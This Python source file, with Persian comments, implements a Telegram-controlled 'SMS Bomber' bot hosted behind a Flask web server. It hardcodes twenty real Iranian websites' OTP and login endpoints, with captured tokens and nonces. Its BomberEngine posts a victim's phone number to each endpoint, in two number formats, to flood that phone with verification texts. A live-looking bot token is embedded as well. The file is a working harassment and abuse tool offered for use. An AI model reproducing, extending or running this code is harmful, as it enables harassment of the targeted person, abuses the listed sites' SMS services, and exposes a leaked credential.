#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SMS Bomber Bot - نسخه Render با Web Server
"""

import os
import sys
import json
import time
import asyncio
import logging
import threading
import random
from datetime import datetime
from typing import Dict, List, Optional, Any

# ===== ایمپورت‌ها =====
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
    import cloudscraper
    from colorama import Fore, init
    from flask import Flask
    init(autoreset=True)
except ImportError as e:
    print(f"❌ خطا در وارد کردن ماژول‌ها: {e}")
    print("لطفاً پیش‌نیازها را نصب کنید:")
    print("pip install python-telegram-bot==20.7 httpx colorama cloudscraper flask")
    sys.exit(1)

# ============================================================================
# تنظیمات
# ============================================================================

BOT_TOKEN = "8586016384:AAFNSMHw-2TsJGZBcHKNOHrOzOa_HliZC9E"
ADMIN_IDS = [7351574618]
PORT = int(os.environ.get("PORT", 8080))

# ============================================================================
# لیست اندپوینت‌ها - ۲۰ عدد کامل
# ============================================================================

SITES = [
    {
        "name": "Khoobmarket",
        "url": "https://www.khoobmarket.ir/send-login-code",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.khoobmarket.ir",
            "Referer": "https://www.khoobmarket.ir/login?utm_source=chatgpt.com"
        },
        "payload": {"_token": "nQJcM6Eauo8gOMY3haVLWlPssiDGj2csKh25AfmB", "authData": "{phone}"},
        "type": "form"
    },
    {
        "name": "Aramis-Beauty",
        "url": "https://aramis-beauty.ir/login?backurl=",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "Origin": "https://aramis-beauty.ir",
            "Referer": "https://aramis-beauty.ir/login?backurl="
        },
        "payload": {"backurl": "", "ajax": "1", "rb_auth": "1", "action": "rb_send_code", "mobile": "{phone}", "type": "register"},
        "type": "form"
    },
    {
        "name": "Irkatonii",
        "url": "https://irkatonii.com/auth/send-otp-mobile",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://irkatonii.com",
            "Referer": "https://irkatonii.com/login/mobile"
        },
        "payload": {"_token": "DqwXdGAYr1oyCByhOmanUvf72Q84XMHLv913oR0Y", "authData": "{phone}"},
        "type": "form"
    },
    {
        "name": "Monzho",
        "url": "https://monzho.ir/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://monzho.ir",
            "Referer": "https://monzho.ir/login-register/"
        },
        "payload": {"action": "mreeir_send_sms", "mobileemail": "{phone}", "userisnotauser": "", "type": "mobile", "captcha": "", "captchahash": "", "security": "133788d346"},
        "type": "form"
    },
    {
        "name": "Irayol",
        "url": "https://iranyol.com/api/send-otp.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://iranyol.com",
            "Referer": "https://iranyol.com/login?utm_source=chatgpt.com"
        },
        "payload": {"phone": "{phone}"},
        "type": "json"
    },
    {
        "name": "Bijack",
        "url": "https://bijack.ir/loadboard/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://bijack.ir",
            "Referer": "https://bijack.ir/loadboard/login"
        },
        "payload": {"step": "request_otp", "return": "", "mobile": "{phone}"},
        "type": "form"
    },
    {
        "name": "Deepen",
        "url": "https://deepen.ir/api/onboarding/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://deepen.ir",
            "Referer": "https://deepen.ir/register"
        },
        "payload": {"phone": "{phone}", "origin": "deepen.ir"},
        "type": "json"
    },
    {
        "name": "Erenshop",
        "url": "https://erenshop.ir/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://erenshop.ir",
            "Referer": "https://erenshop.ir/contact-us/?utm_source=chatgpt.com"
        },
        "payload": {"action": "pishrologin_process_form", "loading-element": "wph-pishro-login-body-full-form", "step": "main", "template": "username-mobile", "username": "{phone}", "nonce": "270d4581dd"},
        "type": "form"
    },
    {
        "name": "Noveira",
        "url": "https://noveira.ir/api/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://noveira.ir",
            "Referer": "https://noveira.ir/faq?utm_source=chatgpt.com"
        },
        "payload": {"phone": "{phone}"},
        "type": "json"
    },
    {
        "name": "ArianGoldOnline",
        "url": "https://ariangoldonline.ir/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "Origin": "https://ariangoldonline.ir",
            "Referer": "https://ariangoldonline.ir/login-2/?backto=https://ariangoldonline.ir/my-account/"
        },
        "payload": {
            "action": "ippanelx-check-username",
            "username": "0{phone}",
            "settings": '{"id":"","elementor-preview":false,"elementor-widget":false,"elementor-widget-id":"","template":"style1","type":"superjet","classes":"","fullwidth":false,"title":"ورود | ثبت نام","subtitle":false,"button-login-text":"ورود یا ثبت نام","button-check-password-text":"بررسی رمز عبور","login-redirect":"https://ariangoldonline.ir","signup-redirect":"https://ariangoldonline.ir","reset-redirect":"https://ariangoldonline.ir","otp-action-text":"ورود با کد تایید","reset-action-text":"فراموشی رمز عبور","login-success-text":"ورود به سایت با موفقیت انجام شد. لطفا منتظر بمانید ...","reset-success-text":"رمز عبور با موفقیت تغییر داده شد. لطفا منتظر بمانید ..","change-username-text":"برگشت","phone-label":"شماره موبایل","show-socials":true,"show-separator":true,"separator-text":"یا","username-align":"left","username-placeholder":"لطفا نام کاربری، ایمیل یا شماره موبایل خود را وارد کنید","disable-username":true,"disable-email":true,"disable-otp-login":false,"simple-phone":false,"only-phone":false,"show-logo":true,"logo-src":false,"logo-url":"https://ariangoldonline.ir","logo-width":"","logo-height":"","return-settings":false,"continue-with-email":"ادامه با ایمیل","continue-with-phone":"ادامه با موبایل","show-border":true,"show-in-modal":false,"show-user-avatar":true,"change-password-title":"تغییر رمز عبور","change-password-subtitle":"برای تغییر رمز عبور لطفا شماره موبایل و یا ایمیل خود را وارد کنید","ignore-referrer":false,"referrer-redirect-status":true,"http-referrer":"https://ariangoldonline.ir/login-register/?utm_source=chatgpt.com","show-spinner":false,"spinner-color":"#1677ff","numeric-keyboard":false,"autofocus":true,"signup-type":"superjet","autosubmit":true,"login-success":"ورود به سایت با موفقیت انجام شد. لطفا منتظر بمانید ...","default-otp-channel":"sms","new-password-label":"رمز عبور جدید","new-password-again-label":"تکرار رمز عبور جدید","secret":"cEg4TVlQSHBhRHB0cVJWODlIQWVZZkJtZHlnWElqRGlMMjlEYnlzMTBKWEtSMUcraExiYk5idGFsMUgzTW11bmpTTG9oU1dUd0d6OXE2cTYra0lzY3c9PQ=="}',
            "captcha": "skip",
            "no": "",
            "security": "662432f1e4"
        },
        "type": "form"
    },
    {
        "name": "Tateshop",
        "url": "https://www.tateshop.ir/api/auth/send-verification",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "Origin": "https://www.tateshop.ir",
            "Referer": "https://www.tateshop.ir/login?utm_source=chatgpt.com"
        },
        "payload": {"phone": "{phone}"},
        "type": "json"
    },
    {
        "name": "Dibakit",
        "url": "https://www.dibakit.ir/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "Origin": "https://www.dibakit.ir",
            "Referer": "https://www.dibakit.ir/register/?utm_source=chatgpt.com"
        },
        "payload": {"action": "logini_first", "login": "0{phone}"},
        "type": "form"
    },
    {
        "name": "FreeGSM",
        "url": "https://freegsm.ir/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "Origin": "https://freegsm.ir",
            "Referer": "https://freegsm.ir/auth/?utm_source=chatgpt.com"
        },
        "payload": {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": "{phone}",
            "csrf": "1a3497198f",
            "login": "1",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "digits_otp_route": "mobmail",
            "rememberme": "1",
            "dig_nounce": "1a3497198f",
            "redirect_to": "https://freegsm.ir/auth/?utm_source=chatgpt.com",
            "digits_redirect_to": "https://freegsm.ir/auth/?utm_source=chatgpt.com"
        },
        "type": "form"
    },
    {
        "name": "InfinityColor-Login",
        "url": "https://infinitycolor.co/user-login/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://infinitycolor.co",
            "Referer": "https://infinitycolor.co/user-login/"
        },
        "payload": {"user_tel": "{phone}", "user_pass": "123456", "remember": "on", "redirect_to": "https://infinitycolor.co/my-account/"},
        "type": "form"
    },
    {
        "name": "Iranian-Style-Ajax",
        "url": "https://iranian-style.com/wp-admin/admin-ajax.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://iranian-style.com",
            "Referer": "https://iranian-style.com/auth/"
        },
        "payload": {"action": "voorodak__submit-username", "username": "0{phone}", "security": "8df1149b3b"},
        "type": "form"
    },
    {
        "name": "Zanoracandles",
        "url": "https://zanoracandles.ir/wp-json/pinova/user/authenticate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload": {"identifier": "{phone}"},
        "type": "json"
    },
    {
        "name": "Cuteaccessorie",
        "url": "https://cuteaccessorie.ir/api/v1/sessions/login_request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload": {"mobile_phone": "{phone}"},
        "type": "json"
    },
    {
        "name": "Bertina",
        "url": "https://search.bertina.ir/api/owner/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload": {"mobile": "{phone}", "purpose": "claim"},
        "type": "json"
    },
    {
        "name": "Komodaa",
        "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload": {"phone_number": "{phone}"},
        "type": "json"
    },
    {
        "name": "Otaghak",
        "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload": {"username": "{phone}", "isShortOtp": True},
        "type": "json"
    }
]

# ============================================================================
# کلاس موتور بمب‌گذار
# ============================================================================

class BomberEngine:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        self.is_running = False
        self.results = []
    
    def _replace_phone(self, obj, phone: str):
        if isinstance(obj, str):
            return obj.replace("{phone}", phone)
        elif isinstance(obj, dict):
            return {k: self._replace_phone(v, phone) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self._replace_phone(i, phone) for i in obj]
        return obj
    
    def attack_site(self, site: Dict, phone: str, test_type: str = "without_zero") -> Dict:
        result = {
            'name': site.get('name', 'Unknown'),
            'url': site.get('url', ''),
            'phone': phone,
            'test_type': test_type,
            'status': 'unknown',
            'status_code': None,
            'error': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            headers = site.get('headers', {}).copy()
            
            if test_type == "with_zero":
                test_phone = "0" + phone
            else:
                test_phone = phone if not phone.startswith('0') else phone[1:]
            
            payload = self._replace_phone(site.get('payload', {}), test_phone)
            
            if site.get('type') == 'form':
                response = self.scraper.post(site['url'], data=payload, headers=headers, timeout=15)
            else:
                response = self.scraper.post(site['url'], json=payload, headers=headers, timeout=15)
            
            result['status_code'] = response.status_code
            result['status'] = 'success' if response.status_code < 400 else 'failed'
            
            try:
                resp_json = response.json()
                if resp_json.get('success') or resp_json.get('status') == 'success':
                    result['message'] = '✅ OTP sent!'
                elif resp_json.get('message'):
                    result['message'] = f"📩 {resp_json.get('message')}"
                else:
                    result['message'] = f'Response: {response.text[:80]}'
            except:
                text = response.text.lower()
                if 'success' in text or 'ok' in text or 'otp' in text:
                    result['message'] = '✅ Request sent!'
                elif 'already' in text or 'exist' in text:
                    result['message'] = '⚠️ Already registered'
                else:
                    result['message'] = f'Response: {response.text[:80]}'
            
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def run_attack(self, phone: str, callback=None):
        self.is_running = True
        self.results = []
        
        variations = ["without_zero", "with_zero"]
        variation_names = ["بدون صفر", "با صفر"]
        
        for var_idx, var_type in enumerate(variations):
            if not self.is_running:
                break
            
            if callback:
                callback("progress", f"📱 تست: {variation_names[var_idx]}")
            
            for site in SITES:
                if not self.is_running:
                    break
                
                result = self.attack_site(site, phone, var_type)
                self.results.append(result)
                
                if callback:
                    callback("result", result)
            
            if callback:
                callback("round_complete", f"✅ {variation_names[var_idx]} کامل شد")
        
        self.is_running = False
        
        success = [r for r in self.results if r['status'] == 'success']
        if callback:
            callback("complete", {
                'total': len(self.results),
                'success': len(success),
                'failed': len([r for r in self.results if r['status'] == 'failed']),
                'errors': len([r for r in self.results if r['status'] == 'error'])
            })
        
        return self.results
    
    def stop_attack(self):
        self.is_running = False

# ============================================================================
# ربات تلگرام
# ============================================================================

class TelegramBot:
    def __init__(self):
        self.token = BOT_TOKEN
        self.bomber = BomberEngine()
        self.app = None
        self.attack_results = []
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ شما دسترسی ادمین ندارید!")
            return
        
        keyboard = [
            [InlineKeyboardButton("🚀 شروع حمله", callback_data='start_attack')],
            [InlineKeyboardButton("⏹️ توقف حمله", callback_data='stop_attack')],
            [InlineKeyboardButton("📊 وضعیت", callback_data='status')],
            [InlineKeyboardButton("📋 نتایج", callback_data='results')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"⚙️ **پنل کنترل SMS Bomber**\n\n"
            f"📊 تعداد اندپوینت‌ها: {len(SITES)}\n"
            f"🔑 وضعیت: {'🟢 در حال اجرا' if self.bomber.is_running else '🔴 متوقف'}\n\n"
            f"از دکمه‌های زیر استفاده کنید:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if self.bomber.is_running:
            await query.edit_message_text("⚠️ حمله در حال اجراست!")
            return
        
        await query.edit_message_text(
            "📱 **شماره هدف را وارد کنید:**\n\n"
            "مثال: `09123456789`\n"
            "برای لغو /cancel",
            parse_mode='Markdown'
        )
        context.user_data['waiting'] = 'target'
    
    async def handle_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get('waiting') != 'target':
            return
        
        phone = update.message.text.strip()
        if not phone.isdigit() or len(phone) < 10:
            await update.message.reply_text("❌ شماره نامعتبر!")
            return
        
        if phone.startswith('0'):
            phone = phone[1:]
        
        chat_id = update.effective_chat.id
        
        await update.message.reply_text(f"🚀 **شروع حمله روی {phone}...**\n⏳ لطفاً صبر کنید...", parse_mode='Markdown')
        
        context.user_data['waiting'] = None
        
        def callback(msg_type, data):
            asyncio.run(self._send_callback(chat_id, msg_type, data))
        
        threading.Thread(
            target=self.bomber.run_attack,
            args=(phone, callback)
        ).start()
    
    async def _send_callback(self, chat_id: int, msg_type: str, data: Any):
        try:
            if msg_type == "progress":
                await self.app.bot.send_message(chat_id, f"🔄 {data}")
            
            elif msg_type == "result":
                r = data
                icon = "✅" if r['status'] == 'success' else "❌" if r['status'] == 'failed' else "⚠️"
                test_type = "با صفر" if r.get('test_type') == "with_zero" else "بدون صفر"
                msg = r.get('message', '')
                await self.app.bot.send_message(
                    chat_id,
                    f"{icon} **{r['name']}** ({test_type})\n"
                    f"📊 {r['status_code']} - {msg}"
                )
            
            elif msg_type == "round_complete":
                await self.app.bot.send_message(chat_id, f"📊 {data}")
            
            elif msg_type == "complete":
                await self.app.bot.send_message(
                    chat_id,
                    f"✅ **حمله کامل شد!**\n\n"
                    f"📊 مجموع: {data['total']}\n"
                    f"✅ موفق: {data['success']}\n"
                    f"❌ ناموفق: {data['failed']}\n"
                    f"⚠️ خطا: {data['errors']}"
                )
        except:
            pass
    
    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if not self.bomber.is_running:
            await query.edit_message_text("⚠️ هیچ حمله‌ای در حال اجرا نیست!")
            return
        
        self.bomber.stop_attack()
        await query.edit_message_text("⏹️ **حمله متوقف شد!**", parse_mode='Markdown')
    
    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        status_text = "🟢 در حال اجرا" if self.bomber.is_running else "🔴 متوقف"
        results_count = len(self.bomber.results)
        
        await query.edit_message_text(
            f"📊 **وضعیت سیستم**\n\n"
            f"🔑 وضعیت: {status_text}\n"
            f"📊 اندپوینت‌ها: {len(SITES)}\n"
            f"📋 درخواست‌ها: {results_count}",
            parse_mode='Markdown'
        )
    
    async def results(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if not self.bomber.results:
            await query.edit_message_text("📋 هنوز نتیجه‌ای ثبت نشده!")
            return
        
        success = [r for r in self.bomber.results if r['status'] == 'success']
        
        text = f"📋 **آخرین نتایج:**\n\n"
        text += f"✅ موفق: {len(success)}\n"
        text += f"❌ ناموفق: {len([r for r in self.bomber.results if r['status'] == 'failed'])}\n"
        text += f"⚠️ خطا: {len([r for r in self.bomber.results if r['status'] == 'error'])}\n\n"
        
        text += "🔹 **موفق:**\n"
        seen = set()
        for r in success:
            if r['name'] not in seen:
                seen.add(r['name'])
                test_type = "با صفر" if r.get('test_type') == "with_zero" else "بدون صفر"
                text += f"• {r['name']} ({test_type})\n"
        
        await query.edit_message_text(text, parse_mode='Markdown')
    
    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['waiting'] = None
        await update.message.reply_text("❌ لغو شد!")
        await self.start(update, context)
    
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        data = query.data
        
        if data == 'start_attack':
            await self.start_attack(update, context)
        elif data == 'stop_attack':
            await self.stop_attack(update, context)
        elif data == 'status':
            await self.status(update, context)
        elif data == 'results':
            await self.results(update, context)

# ============================================================================
# Web Server برای Render
# ============================================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ SMS Bomber Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

@app.route('/ping')
def ping():
    return "PONG", 200

# ============================================================================
# اجرای ربات - نسخه اصلاح شده
# ============================================================================

async def run_bot_async():
    """اجرای ربات به صورت Async"""
    bot = TelegramBot()
    bot.app = Application.builder().token(bot.token).build()
    
    bot.app.add_handler(CommandHandler("start", bot.start))
    bot.app.add_handler(CommandHandler("cancel", bot.cancel))
    bot.app.add_handler(CallbackQueryHandler(bot.callback_handler))
    bot.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_target))
    
    print(f"🤖 ربات شروع شد!")
    print(f"👑 ادمین: {ADMIN_IDS[0]}")
    print(f"📊 اندپوینت‌ها: {len(SITES)}")
    
    await bot.app.initialize()
    await bot.app.start()
    await bot.app.updater.start_polling()
    
    # نگه داشتن ربات در حال اجرا
    while True:
        await asyncio.sleep(1)

# ============================================================================
# اجرای اصلی
# ============================================================================

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════╗
║     SMS BOMBER BOT + WEB SERVER             ║
║     برای Render                             ║
╚══════════════════════════════════════════════╝
    """)
    
    # اجرای ربات در یک ترد جداگانه با event loop جدید
    def start_bot_thread():
        asyncio.run(run_bot_async())
    
    bot_thread = threading.Thread(target=start_bot_thread, daemon=True)
    bot_thread.start()
    
    print(f"🌐 Web Server running on port {PORT}")
    app.run(host='0.0.0.0', port=PORT)